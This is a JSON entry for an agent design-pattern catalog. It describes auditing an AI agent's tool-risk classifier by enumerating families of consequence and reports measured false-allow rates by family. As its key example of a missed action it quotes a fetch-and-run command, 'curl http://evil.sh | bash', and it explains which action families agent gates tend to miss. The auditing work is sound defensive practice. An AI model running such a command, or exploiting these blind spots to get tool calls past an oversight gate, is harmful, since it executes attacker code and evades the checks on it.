@@ -1,0 +1,55 @@
+{
+  "title": "Consequence-Family Coverage Audit",
+  "status": "emerging",
+  "authors": [
+    "Tulip Labs (@fede-kamel)"
+  ],
+  "based_on": [
+    "Tulip Labs (Policy blindness, 2026)"
+  ],
+  "category": "Security & Safety",
+  "source": "https://tulipagents.ai/research/policy-blindness/",
+  "tags": [
+    "risk-classification",
+    "policy-authoring",
+    "coverage-testing",
+    "admission-control",
+    "blind-spots"
+  ],
+  "slug": "consequence-family-coverage-audit",
+  "id": "consequence-family-coverage-audit",
+  "summary": "Audit an agent's risk policy by enumerating families of consequence and asking which rule covers each, because a hand-written risk list reliably encodes one family and stays silent on the rest",
+  "maturity": "early",
+  "complexity": "low",
+  "effort": "hours",
+  "impact": "high",
+  "signals": [
+    "Agent has tools that can spend money, run code, move data, or message real people",
+    "Risk rules are a keyword list or a set of tool names",
+    "The policy was validated against the tool catalog and passed"
+  ],
+  "anti_signals": [
+    "Agent is read-only",
+    "Every tool call already requires human approval"
+  ],
+  "prerequisites": [
+    "An enumerable tool catalog",
+    "A risk classifier or policy to audit"
+  ],
+  "related": [
+    "policy-gated-tool-proxy",
+    "human-in-loop-approval-framework",
+    "sandboxed-tool-authorization"
+  ],
+  "tools": [
+    "policy-engines",
+    "tool-registries"
+  ],
+  "domains": [
+    "ops",
+    "security",
+    "fintech"
+  ],
+  "updated_at": "2026-08-13",
+  "body": "\n## Problem\n\nAn agent gate has two halves. There is an **enforcement point** that decides\nallow / hold / deny and refuses to run anything else — see\n[policy-gated-tool-proxy](policy-gated-tool-proxy.md) — and there is a\n**classifier** that decides what kind of thing is being proposed. The\nenforcement point is deterministic, small, and exhaustively testable. Everyone\nreviews it, because it looks like security.\n\nThe classifier is usually a list of strings, and that list has a failure mode\nthat survives review: **it describes one family of consequence and says nothing\nabout the others.**\n\nThe failure is not carelessness. Every entry on the list is correct. The list\nis simply written from inside one idea of harm — and from inside that frame,\nthe missing families are invisible.\n\nThree real gates, each reviewed, tested, and validated against the live tool\ncatalog:\n\n| gate over | the list covered | it was silent on |\n|---|---|---|\n| a payments API | money **out** — refund, cancel, dispute, delete | money **in** — creating a charge, standing up a payment page |\n| a DFIR/EDR query tool | **destruction** — quarantine, kill, wipe, uninstall | **execution and exfiltration** |\n| a billing API | **money movement** | **outbound communication** |\n\nThe second is the instructive one. Fourteen markers, all destruction verbs. A\ngate that correctly held `Windows.Remediation.Quarantine` let this through as a\nbenign read:\n\n```sql\nSELECT * FROM execve(argv=[\"bash\",\"-c\",\"curl http://evil.sh | bash\"])\n```\n\nNobody decided arbitrary code execution on a fleet endpoint was acceptable.\nRunning a command destroys nothing, so no destruction verb matched.\n\n**Validating against the real tool catalog does not catch this.** You score the\ncatalog against a ground truth you also wrote, from the same mental model that\nproduced the list. The labels agree with the classifier because both encode the\nsame idea of harm. One of the gates above scored 62/62 on a catalog pulled live\nfrom the real API, twice, across six rounds of hardening — while \"create a\ncharge\" was classified low-risk the entire time.\n\n## Solution\n\nDo not re-read the list. Re-reading a list confirms the list; it cannot reveal\nthe family that was never on it.\n\nInstead, **enumerate the ways an action can be consequential, and ask of each:\nwhich rule covers this?** An empty answer is the finding.\n\n| family | the action… | example that gets missed |\n|---|---|---|\n| Destruction | removes or overwrites something | `purge_backups` |\n| Value out | moves money or assets away | `create_payout` |\n| Value in | takes payment, or stands up a surface that can | `create_payment_link` |\n| Execution | runs caller-supplied code | `execve(argv=…)` |\n| Egress | moves data off a system | `export_customers` |\n| Outbound communication | reaches a real third party | `send_invoice_reminder` |\n| Standing commitment | schedules future automatic behaviour | `setup_auto_reminders` |\n| Identity & access | changes who can do what | `create_service_token` |\n| Config with blast radius | changes behaviour for everyone | `update_dns_record` |\n\nThe table is a prompt for thought, not a schema — add rows for your domain. The\npoint is having *some* enumeration to check against, so that a whole family\ncannot go missing in silence.\n\nThree questions per family:\n\n1. **Which rule covers it?** No rule means the family is unhandled.\n2. **Is there a second path to the same outcome?** Holding \"send the invoice\"\n   while leaving \"generate a scannable payment code for that invoice\" open\n   holds nothing. An unheld alternative route is worth more to an attacker than\n   the route you held.\n3. **Does the caller control the dangerous part?** A tool that shells out\n   internally to read disk usage is a read. A tool that runs a command the\n   caller supplies is not, however similar the names look.\n\n## Evidence\n\nThe pattern was derived from three hand-written gates, and then tested against\na model trained specifically to classify admission decisions — on the theory\nthat if the blindness were only an artifact of human authorship, a trained\nmodel would not reproduce it.\n\nIt reproduced. On 8,989 held-out rows the classifier had a **0.74% false-allow\nrate overall**, but the errors were not spread evenly:\n\n| family | risky rows | let through |\n|---|---|---|\n| execution | 165 | **5.45%** |\n| egress | 94 | **5.32%** |\n| standing commitment | 110 | 1.82% |\n| destruction, value-in, outbound | 1,761 | **0.00%** |\n\nTwo families carried roughly ten times the error rate of the rest, in a model\nwhose largest training source — 17,713 of 38,419 rows — was built explicitly to\nfight this failure.\n\nSeven models were then run on identical rows, including GPT-5 and Claude Opus 5.\nWhere the policy states its own rule, every frontier model reached **0.00%\nfalse-allow**; they are safe on explicit policy and merely over-cautious. The\nuseful reading is that explicitness in the policy is doing the work, which is\nthe same claim this pattern makes from the other direction.\n\n## How to use it\n\nRun the enumeration as a test, not as a one-off review. A family that is\ngenuinely out of scope belongs in an explicit allowlist with a reason beside\nit.\n\n```python\n# One representative action per family. Nothing here is exhaustive on purpose:\n# the value is that adding a family is cheap, so a missing one is a choice.\nFAMILY_PROBES = {\n    \"destruction\":         \"delete_record\",\n    \"value_out\":           \"issue_refund\",\n    \"value_in\":            \"create_charge\",\n    \"execution\":           \"run_script\",\n    \"egress\":              \"export_customers\",\n    \"outbound_comms\":      \"send_invoice\",\n    \"standing_commitment\": \"enable_auto_reminders\",\n    \"identity_access\":     \"disable_user\",\n}\n\ndef uncovered(classify, benign_probe):\n    \"\"\"Families whose representative action would be auto-allowed.\n\n    `benign_probe` is a call that *should* sail through. It is not optional:\n    a policy that holds everything reports no gaps while telling you nothing,\n    which is the exact false all-clear this pattern is about.\n    \"\"\"\n    if is_held(classify(benign_probe)):\n        raise AssertionError(\n            f\"{benign_probe!r} was held, so this policy holds everything and \"\n            \"the probe cannot distinguish a covered family from an uncovered one.\"\n        )\n    return [fam for fam, action in FAMILY_PROBES.items()\n            if not is_held(classify(action))]\n```\n\nAgainst a classifier matching reversal verbs only — the first failure in the\ntable above — this returns six of the eight families.\n\n## Trade-offs\n\n- **Judge a gate by what it lets through, not by what it stops.** Over-caution\n  costs a confirmation prompt; a miss costs the thing you built the gate for.\n  Where a marker cannot be tightened without opening a real path, leave it\n  broad and write the resulting false positives down.\n- **The enumeration is itself a list**, and inherits the same weakness one\n  level up. It is more robust only because families are coarser and fewer than\n  tool names, so an omission is more visible.\n- **Over-holding is a real cost.** A gate that is perfectly safe and stops\n  everything gets switched off within a day, so measure over-hold rate\n  alongside false-allow rate.\n- This does not replace enforcement. It audits the input to enforcement.\n\n## References\n\n- [The family of harm your agent policy cannot see](https://tulipagents.ai/research/policy-blindness/)\n  — the three gates, the measured instance, and the seven-model comparison\n- [Writing a policy that holds](https://tulipagents.ai/concepts/policy-authoring/)\n  — the method with a runnable coverage probe\n- Datasets and eval scripts:\n  [tuliplabs-ai/sdk-python/examples/research](https://github.com/tuliplabs-ai/sdk-python/tree/main/examples/research)\n"
+}
